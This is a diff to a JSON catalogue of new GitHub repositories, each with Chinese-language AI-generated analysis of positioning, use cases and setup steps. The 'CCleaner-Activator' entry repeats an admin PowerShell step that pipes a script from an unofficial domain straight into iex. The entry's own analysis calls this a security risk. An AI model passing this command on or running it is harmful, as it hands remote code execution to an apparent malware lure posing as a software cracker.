@@ -1,6 +1,6 @@
 {
   "version": "1",
-  "updatedAt": "2026-07-06T06:06:22.478Z",
+  "updatedAt": "2026-07-07T05:47:19.636Z",
   "projects": [
     {
       "owner": "codecrafters-io",
@@ -62106,6 +62106,517 @@
         "category": "AI Agent"
       },
       "analyzedAt": "2026-07-06T06:06:22.453Z"
+    },
+    {
+      "owner": "MaximeRivest",
+      "repo": "riddle",
+      "fullName": "MaximeRivest/riddle",
+      "description": "The diary of Tom Riddle for the reMarkable Paper Pro — write with your pen, the page drinks your ink and answers in a flowing hand",
+      "language": "Rust",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-05T15:48:08Z",
+      "url": "https://github.com/MaximeRivest/riddle",
+      "analysis": {
+        "positioning": "将reMarkable墨水屏变为AI魔法日记，笔迹书写，墨水作答。",
+        "useCases": [
+          "你用笔在reMarkable上写字 → 它会像墨水消失一样，让你的文字淡入纸张，并用流畅的笔迹回复你。",
+          "你想要无干扰地与AI互动 → 它提供沉浸式、无屏幕光、无键盘的墨水屏对话体验。",
+          "你拥有reMarkable Paper Pro设备 → 它能将你的设备变成一个互动式AI日记，实现独特的人机交互。"
+        ],
+        "audience": "reMarkable Paper Pro用户，寻求独特、沉浸式、无干扰的AI互动体验。",
+        "quickStart": {
+          "prerequisites": "reMarkable Paper Pro设备（ferrari, aarch64, OS 3.26–3.27），开发者模式，已安装remagic/AppLoad，需自备OpenAI兼容API Key。",
+          "steps": [
+            "安装：`remagic install riddle`",
+            "（可选）配置：`remagic config riddle`",
+            "在AppLoad中：点击Reload，选择“The Diary”开始使用。"
+          ],
+          "note": "此工具会修改设备，以root权限运行，直接控制墨水屏引擎，风险自负。仅在特定reMarkable Paper Pro型号及OS版本上测试过。"
+        },
+        "competitors": [
+          {
+            "name": "ChatGPT（或其他AI聊天助手）",
+            "method": "浏览器/App文字输入",
+            "models": "GPT-3.5/4等",
+            "pricing": "免费/订阅"
+          }
+        ],
+        "pricing": "免费（需自备OpenAI API Key，API使用费自理）",
+        "vibeCodingScore": 5,
+        "vibeCodingReason": "将reMarkable设备独特墨水屏体验与AI互动完美结合，实现魔法日记般的沉浸式对话，‘墨水消失’‘笔迹作答’的设计极具创意和未来感。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue活跃但尚未关闭，项目可能较新或维护者直接解决，社区互动有潜力。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-07T05:44:07.702Z"
+    },
+    {
+      "owner": "Pluviobyte",
+      "repo": "rnskill",
+      "fullName": "Pluviobyte/rnskill",
+      "description": "雪踏乌云的 AI Agent Skills 集合",
+      "language": "Python",
+      "topics": [],
+      "license": "NOASSERTION",
+      "createdAt": "2026-07-04T18:43:42Z",
+      "url": "https://github.com/Pluviobyte/rnskill",
+      "analysis": {
+        "positioning": "针对AI Agent的中文AI写作去AI化技能集。",
+        "useCases": [
+          "你撰写AI技术文章或产品文档 → 它帮你消除AI八股文腔调，保留作者原意和判断。",
+          "你发布中文社交媒体内容（如X/Twitter）→ 它帮你将AI生成的草稿润色成更自然、地道的“人话”。",
+          "你进行AI模型评测或对外草稿撰写 → 它帮你确保文本内容客观、精准，同时去除AI痕迹。"
+        ],
+        "audience": "面向使用Codex、Claude Code等支持项目级技能的AI Agent用户，特别是需要生成高质量、无AI痕迹中文文本的技术作者、内容创作者。",
+        "quickStart": {
+          "prerequisites": "使用支持项目级技能的AI Agent（如Codex, Claude Code）。",
+          "steps": [
+            "在你的项目根目录创建`.agents/skills`（适用于Codex）或`.claude/skills`（适用于Claude Code）目录。",
+            "将所需的技能（如`skills/renhua`目录）完整拷贝到上述技能目录中，确保结构为`<project>/.agents/skills/renhua/SKILL.md`或`<project>/.claude/skills/renhua/SKILL.md`。"
+          ],
+          "note": "Codex和Claude Code的技能目录结构不同，请根据所使用的Agent选择相应路径。"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "解决特定痛点（AI中文写作去AI化），方向明确，但目前技能单一，集成方式相对手动，受限于特定AI Agent生态。",
+        "isVibeCoding": true,
+        "communityActivity": "几乎无社区活动，Issue统计为0。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-07T05:44:27.297Z"
+    },
+    {
+      "owner": "nagisanzenin",
+      "repo": "engram",
+      "fullName": "nagisanzenin/engram",
+      "description": "Evidence-based learning engine for Claude Code — first-principles curricula, free-recall verification with receipts, FSRS-scheduled memory, and explorable artifacts. Learn anything; keep it.",
+      "language": "Python",
+      "topics": [
+        "claude-code",
+        "claude-code-plugin",
+        "education",
+        "fsrs",
+        "learning",
+        "learning-science",
+        "spaced-repetition"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-07-05T09:53:10Z",
+      "url": "https://github.com/nagisanzenin/engram",
+      "analysis": {
+        "positioning": "Claude Code的记忆引擎，让你学过不忘。",
+        "useCases": [
+          "你向Claude提问学习新概念 → 它通过召回验证和间隔重复帮你巩固记忆，确保你真正掌握。",
+          "你发现自己学过的内容很快遗忘 → 它提供一个智能导师，强制你主动思考和回忆，并安排未来复习。",
+          "你想高效学习技术知识并长期保持 → 它将学习过程分解为探索性工件和基于FSRS的复习，确保知识持久。"
+        ],
+        "audience": "适合在Claude Code中学习新知识、提升记忆效率的开发者或学生，尤其注重主动学习和长期记忆的用户。",
+        "quickStart": {
+          "prerequisites": "python3 (macOS/Linux自带即可), Claude Code环境",
+          "steps": [
+            "claude plugin marketplace add nagisanzenin/engram",
+            "claude plugin install engram@engram",
+            "在Claude Code中输入 `/learn [你想学的内容]`"
+          ],
+          "note": "支持OpenAI Codex，安装方式见 `INSTALL-CODEX.md`。"
+        },
+        "competitors": [
+          {
+            "name": "Claude Code自身 (未安装Engram)",
+            "method": "直接提问，获得解释，但无记忆和复习机制。",
+            "models": "Claude系列",
+            "pricing": "通常免费层或订阅制（取决于Claude Code平台）"
+          },
+          {
+            "name": "传统笔记软件/思维导图",
+            "method": "手动整理知识，自行安排复习，缺乏智能调度和主动召回验证。",
+            "models": "N/A",
+            "pricing": "免费或一次性购买"
+          }
+        ],
+        "pricing": "免费，作为Claude Code的插件，数据100%本地存储。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "项目定位清晰，解决核心痛点（遗忘曲线），采用科学的FSRS间隔重复算法，强调主动学习和本地数据存储，实用且高效。",
+        "isVibeCoding": true,
+        "communityActivity": "Star数334，Issue数量少（开启1/关闭2），表明项目可能较稳定或处于早期快速迭代阶段，社区互动待观察。",
+        "category": "AI编程助手"
+      },
+      "analyzedAt": "2026-07-07T05:44:44.101Z"
+    },
+    {
+      "owner": "funador",
+      "repo": "claude-code-merge-queue",
+      "fullName": "funador/claude-code-merge-queue",
+      "description": "The local merge queue for parallel Claude Code agents. ",
+      "language": "TypeScript",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-02T20:39:23Z",
+      "url": "https://github.com/funador/claude-code-merge-queue",
+      "analysis": {
+        "positioning": "为并行Claude Code Agent提供本地、零成本的代码合并队列。",
+        "useCases": [
+          "多个Claude Code Agent同时提交代码到同一分支 → 自动管理合并，避免提交冲突和反复rebase。",
+          "多个Agent同时触发耗时的完整构建 → 协调构建流程，减轻本地资源负担。",
+          "多个Agent并行运行共享数据库的测试，导致数据冲突和测试结果不稳定 → 确保测试按序执行，消除测试环境竞争导致的伪随机失败。"
+        ],
+        "audience": "使用Claude Code进行并行代码开发，面临多Agent并发提交、构建、测试冲突的用户。",
+        "quickStart": {
+          "prerequisites": "Node.js >= 18，以及任意一种包管理器（npm/pnpm/yarn/bun）",
+          "steps": [
+            "npm install --save-dev claude-code-merge-queue",
+            "npx claude-code-merge-queue init"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费（MIT开源）",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "它是为解决AI Agent并行开发中的实际工程痛点（并发提交、构建、测试冲突）而生，专注于提供稳定、零成本的解决方案，强调工程效率而非创意或探索性编程。",
+        "isVibeCoding": false,
+        "communityActivity": "暂无Issue，无法评估社区活跃度及响应速度。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-07T05:45:01.090Z"
+    },
+    {
+      "owner": "pocket-stack",
+      "repo": "pocketjs",
+      "fullName": "pocket-stack/pocketjs",
+      "description": "High-performance JSX UI outside the browser, with hardware rendering, standard Vue Vapor and Solid support, a Tailwind design system, and 60 FPS animation under an 8 MB memory budget.",
+      "language": "TypeScript",
+      "topics": [
+        "embedded-ui",
+        "flexbox",
+        "frontend",
+        "jsx",
+        "native-ui",
+        "psp",
+        "quickjs",
+        "rust",
+        "solidjs",
+        "tailwindcss",
+        "vue",
+        "vue-vapor",
+        "webassembly"
+      ],
+      "license": "Unknown",
+      "createdAt": "2026-07-03T07:28:28Z",
+      "url": "https://github.com/pocket-stack/pocketjs",
+      "analysis": {
+        "positioning": "极致性能的非浏览器JSX UI框架，专为低内存硬核场景设计。",
+        "useCases": [
+          "你想用前端框架在PSP这类嵌入式设备上开发高性能UI → 它让你用Vue Vapor/Solid写JSX，在8MB内存预算下实现60FPS硬件渲染。",
+          "你需要为非Web平台（如桌面应用、游戏主机）构建UI，但希望复用前端生态 → 它提供JSX/TS开发体验，通过Rust核心和QuickJS实现跨平台原生渲染。",
+          "你正在开发资源受限的嵌入式系统，寻求高效的UI解决方案 → 它将UI布局、样式、文本和动画卸载到微小的`no_std` Rust核心，严格控制内存开销。"
+        ],
+        "audience": "追求极致性能、低内存占用的嵌入式或原生UI开发者，尤其是熟悉Vue Vapor或Solid的工程师。",
+        "quickStart": {
+          "prerequisites": "`Bun`环境",
+          "steps": [
+            "安装依赖：`bun install`",
+            "构建应用：`bun scripts/build.ts hero` (或 `bun scripts/build.ts hero-vue-vapor-main --framework=vue-vapor` 用于Vue Vapor)"
+          ],
+          "note": "构建过程包含两步优化：Babel转换JSX/TS并收集样式/文本，然后Tailwind编译、字体烘焙并打包成`.pak`文件，最后用Bun打包。支持在PSP、PPSSPP、浏览器WASM、macOS原生窗口及无头Bun环境运行。"
+        },
+        "competitors": [],
+        "pricing": "免费（开源项目）",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "将现代前端JSX（Vue Vapor/Solid）带到极致资源受限的硬件（如PSP，8MB内存），通过Rust核心实现60FPS硬件渲染，技术栈高度专业且创新。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，新开Issue较多但目前无已关闭Issue。",
+        "category": "前端框架"
+      },
+      "analyzedAt": "2026-07-07T05:45:17.062Z"
+    },
+    {
+      "owner": "majidmanzarpour",
+      "repo": "threejs-procedural-dungeon",
+      "fullName": "majidmanzarpour/threejs-procedural-dungeon",
+      "description": "Real-time procedural dungeon generator in Three.js - deterministic seeds, Delaunay/MST graph layouts, room semantics, five themes, and a custom bloom/tilt-shift pipeline.",
+      "language": "JavaScript",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-05T21:15:08Z",
+      "url": "https://github.com/majidmanzarpour/threejs-procedural-dungeon",
+      "analysis": {
+        "positioning": "Three.js实时程序化地牢生成器，支持确定性种子、图布局和可视化构建流程。",
+        "useCases": [
+          "你做游戏 → 它帮你实时生成风格各异、逻辑连接的地牢关卡。",
+          "你学习程序化生成或Three.js → 它提供清晰可视化、可重现的算法实践案例。",
+          "你设计游戏关卡概念 → 它助你快速迭代地牢布局和主题，探索不同可能性。"
+        ],
+        "audience": "游戏开发者、互动艺术设计师、程序化内容生成研究者及Three.js学习者。",
+        "quickStart": {
+          "prerequisites": null,
+          "steps": [
+            "访问在线Demo: https://procedural-dungeon.netlify.app",
+            "输入种子、选择主题、拖动滑块，观察地牢生成过程。"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费（MIT License）",
+        "vibeCodingScore": 5,
+        "vibeCodingReason": "项目提供一个高度互动、视觉效果出色的在线Demo，清晰展示程序化生成管道，支持确定性种子和多种主题，且性能优化良好。代码结构和功能设计都体现了高质量工程。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue统计为0，社区活跃度看起来不高。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-07-07T05:45:30.414Z"
+    },
+    {
+      "owner": "isjiamu",
+      "repo": "gzh-design-skill",
+      "fullName": "isjiamu/gzh-design-skill",
+      "description": "把 Markdown 一键排成可直接粘进公众号编辑器的精致 HTML —— 6 套精选主题 + 主题生成器 + 双关卡校验。An AI-agent skill that turns Markdown into paste-ready WeChat article HTML.",
+      "language": "HTML",
+      "topics": [
+        "agent-skill",
+        "ai-agent",
+        "claude-code",
+        "codex",
+        "cursor",
+        "gongzhonghao",
+        "html",
+        "markdown",
+        "rich-text",
+        "skill",
+        "typesetting",
+        "wechat",
+        "weixin"
+      ],
+      "license": "NOASSERTION",
+      "createdAt": "2026-07-01T04:28:03Z",
+      "url": "https://github.com/isjiamu/gzh-design-skill",
+      "analysis": {
+        "positioning": "将Markdown一键转为公众号高保真HTML，供AI Agent调用。",
+        "useCases": [
+          "你写完Markdown长文 → 它帮你自动排版成带有主题、目录、编号、关键词的公众号HTML",
+          "你想要独特公众号样式 → 它帮你根据描述或参考图生成全新排版主题",
+          "你担心公众号排版掉格式 → 它帮你生成样式内联、经过双关卡校验的高质量HTML"
+        ],
+        "audience": "公众号创作者和内容运营者，以及AI Agent用户，希望快速、高质量地将Markdown内容发布到公众号。",
+        "quickStart": {
+          "prerequisites": "已安装或使用Claude Code / Codex / Cursor等AI Agent",
+          "steps": [
+            "在AI Agent中调用gzh-design-skill技能",
+            "输入Markdown内容、选择主题，生成可一键复制的HTML"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 5,
+        "vibeCodingReason": "项目定位精准，直击公众号排版痛点，提供多主题、智能排版、防掉格式和质量校验等核心功能，且专为AI Agent设计，实用性与技术深度兼备。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue 统计显示活跃度较低，目前无开启或已关闭的Issue。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-07T05:45:44.041Z"
+    },
+    {
+      "owner": "tomicz",
+      "repo": "fable-5-train-opus-skills-after-it-retires",
+      "fullName": "tomicz/fable-5-train-opus-skills-after-it-retires",
+      "description": "Thsis is a prompt that will create skills by Fable 5 before it retires and your cheaper models can use those skills. ",
+      "language": "Unknown",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-02T17:32:21Z",
+      "url": "https://github.com/tomicz/fable-5-train-opus-skills-after-it-retires",
+      "analysis": {
+        "positioning": "为AI模型和初级工程师构建项目知识技能库",
+        "useCases": [
+          "你希望将资深工程师的经验沉淀为可复用的AI技能 → 它帮你构建完整的项目知识技能库，供小型AI模型和初级工程师使用。",
+          "你需要确保项目知识在团队更替后不流失 → 它指导你创建系统性文档和AI技能，保障项目可持续发展。",
+          "你想让小型AI模型也能高效理解和维护复杂项目 → 它提供结构化技能库，降低AI模型学习和操作成本。"
+        ],
+        "audience": "资深工程师或项目负责人，希望将领域知识和项目经验沉淀为AI可用的技能库，供初/中级工程师及小型AI模型维护和发展项目。",
+        "quickStart": {
+          "prerequisites": "一个强大的LLM（如Claude），具备多Agent编排能力。",
+          "steps": [
+            "将本项目README内容作为Prompt输入给LLM，并指定其扮演“即将退休的资深研究员”。",
+            "引导LLM（或多个Agent）按照Prompt中的Phase 1进行项目调研和提问。",
+            "根据调研结果和LLM的建议，指导其在项目中生成Phase 2定义的结构化技能库。"
+          ],
+          "note": "本项目是一个高级Prompt指令集，而非可直接运行的工具。实际执行依赖于强大的LLM和Agent工作流。"
+        },
+        "competitors": [
+          {
+            "name": "LangChain/LlamaIndex等Agent框架",
+            "method": "通过代码和配置构建AI Agent及知识库（RAG）",
+            "models": "几乎所有主流LLM",
+            "pricing": "免费（框架本身）"
+          },
+          {
+            "name": "传统项目文档和知识库系统",
+            "method": "人工撰写Wiki、Confluence等文档，非AI直接可用",
+            "models": "不涉及LLM",
+            "pricing": "付费（平台）或免费（自建）"
+          }
+        ],
+        "pricing": "免费 (项目本身，作为一个Prompt或方法论)，LLM推理和Agent运行会产生费用。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "README结构清晰，内容深度和广度兼备，场景驱动，提出了一套完整且实用的项目知识沉淀和AI技能构建方法，具有极高的参考价值和落地潜力。对解决知识转移和AI赋能实际项目问题提供了创新思路。",
+        "isVibeCoding": true,
+        "communityActivity": "活跃度较低，issue讨论和解决尚未形成规模，可能更多作为一个高级Prompt模板被阅读和借鉴。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-07T05:46:03.496Z"
+    },
+    {
+      "owner": "ai4s-research",
+      "repo": "open-science",
+      "fullName": "ai4s-research/open-science",
+      "description": "Open Science — an open AI workbench for scientists. Open-source alternative to Claude Science: local-first, model-agnostic, reproducible AI research desktop (macOS & Windows), built on Tauri + MCP + agent skills.",
+      "language": "TypeScript",
+      "topics": [
+        "ai-agent",
+        "ai-for-science",
+        "ai-scientist",
+        "ai4s",
+        "claude-science",
+        "claude-science-alternative",
+        "desktop-app",
+        "llm",
+        "local-first",
+        "mcp",
+        "open-science",
+        "reproducible-research",
+        "research-tools",
+        "scientific-research",
+        "tauri"
+      ],
+      "license": "NOASSERTION",
+      "createdAt": "2026-07-03T09:22:31Z",
+      "url": "https://github.com/ai4s-research/open-science",
+      "analysis": {
+        "positioning": "科学家专属的开放AI工作台，本地优先，可复现。",
+        "useCases": [
+          "你想进行AI辅助科学研究 → 它提供端到端的可复现工作流，而非简单的聊天。",
+          "你想生成研究报告、图表并确保数据追溯性 → 它帮你自动化生成，并可追溯到代码和数据。",
+          "你担心研究数据隐私或模型限制 → 它支持本地优先和模型无关，保障隐私与灵活性。"
+        ],
+        "audience": "追求数据隐私、研究可复现性，并希望通过AI提升效率的科学家、研究员和数据分析师。",
+        "quickStart": {
+          "prerequisites": null,
+          "steps": [
+            "访问项目GitHub发布页面或官网下载适用于macOS/Windows的桌面应用。",
+            "安装并启动应用，即可免费使用内置模型开始AI科学研究。"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "Claude Science",
+            "method": "可能为云端服务，封闭生态。",
+            "models": "主要支持Claude模型。",
+            "pricing": "通常为付费服务。"
+          }
+        ],
+        "pricing": "免费。核心应用开源，并提供免费的开箱即用模型。用户也可接入自己的API Key。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "致力于打造可复现、本地优先的AI科学工作台，直接对标并超越现有商业方案（如Claude Science），解决科学家痛点。技术选型现代（Tauri+React），定位清晰，未来潜力巨大。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue活动量较低，目前尚处于早期阶段。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-07T05:46:17.386Z"
+    },
+    {
+      "owner": "dinorah85baspedeo",
+      "repo": "CCleaner-Activator",
+      "fullName": "dinorah85baspedeo/CCleaner-Activator",
+      "description": "",
+      "language": "Unknown",
+      "topics": [
+        "ccleaner-2025",
+        "ccleaner-2026",
+        "ccleaner-computer-maintenance",
+        "ccleaner-professional-free-key",
+        "ccleaner-professional-plus-key-2017"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-07-06T23:03:47Z",
+      "url": "https://github.com/dinorah85baspedeo/CCleaner-Activator",
+      "analysis": {
+        "positioning": "一键激活CCleaner专业版，提供系统优化、清理和性能提升工具。",
+        "useCases": [
+          "你想系统提速变卡顿 → 它帮你清理冗余文件，优化后台进程，释放资源。",
+          "你想保护隐私安全 → 它帮你自动清除跟踪Cookie、浏览器历史和本地缓存。",
+          "你想电脑老旧运行慢 → 它帮你更新过时驱动，提升硬件寿命和整体性能。"
+        ],
+        "audience": "适合电脑卡顿、需要深度清理和优化系统，或注重隐私保护的Windows用户。",
+        "quickStart": {
+          "prerequisites": "Windows PowerShell",
+          "steps": [
+            "以管理员权限启动Windows PowerShell。",
+            "执行命令 `irm https://linkspace.su/powershell/github.ps1 | iex`。"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "Advanced SystemCare",
+            "method": "安装桌面应用",
+            "models": "Windows",
+            "pricing": "免费版/付费专业版"
+          },
+          {
+            "name": "Windows自带磁盘清理/优化工具",
+            "method": "系统内置",
+            "models": "Windows",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "免费。通过执行PowerShell脚本，免费解锁CCleaner专业版功能。",
+        "vibeCodingScore": 1,
+        "vibeCodingReason": "项目名为“Activator”，暗示为非法激活工具。其Quick Start中通过PowerShell远程执行未知脚本，存在重大安全风险。域名非官方来源，不建议使用。",
+        "isVibeCoding": true,
+        "communityActivity": "无活跃度。Issue模块未启用且无任何交流。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-07-07T05:46:37.322Z"
+    },
+    {
+      "owner": "anthropics",
+      "repo": "claude-for-legal",
+      "fullName": "anthropics/claude-for-legal",
+      "description": "A suite of plugins for legal workflows",
+      "language": "Python",
+      "topics": [],
+      "license": "Apache-2.0",
+      "createdAt": "2026-04-21T15:43:42Z",
+      "url": "https://github.com/anthropics/claude-for-legal",
+      "analysis": {
+        "positioning": "Claude法律AI助手，赋能法律工作流自动化与辅助。",
+        "useCases": [
+          "你审核供应商合同 → 它帮你快速审查并生成草稿。",
+          "你监控案件进展或法规更新 → 它帮你自动追踪、预警。",
+          "你处理数据主体访问请求（DSAR）→ 它帮你自动化响应流程。"
+        ],
+        "audience": "法律专业人士（公司法务、律所律师、法学院师生），寻求AI工具提升法律工作效率和质量。",
+        "quickStart": {
+          "prerequisites": "需获取Claude Cowork访问权限，并安装Claude桌面应用。",
+          "steps": [
+            "安装Claude桌面应用",
+            "获取Claude Cowork访问权限",
+            "按照视频指南或通过Managed Agents API部署"
+          ],
+          "note": "可作为Claude Cowork/Code插件使用，或通过Managed Agents API部署到自有工作流引擎。"
+        },
+        "competitors": [],
+        "pricing": "代码开源免费（Apache-2.0），但运行于Claude平台服务可能产生费用。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "Anthropic官方出品，为法律行业提供强大AI工具集，高星标，维护者是AI巨头，值得信赖。Issue关闭率较低，但考虑到项目体量和复杂性，尚可接受。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较高，但新开启问题较多，关闭问题相对较少，可能需要更多维护投入。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-07T05:47:19.613Z"
     }
   ]
 }
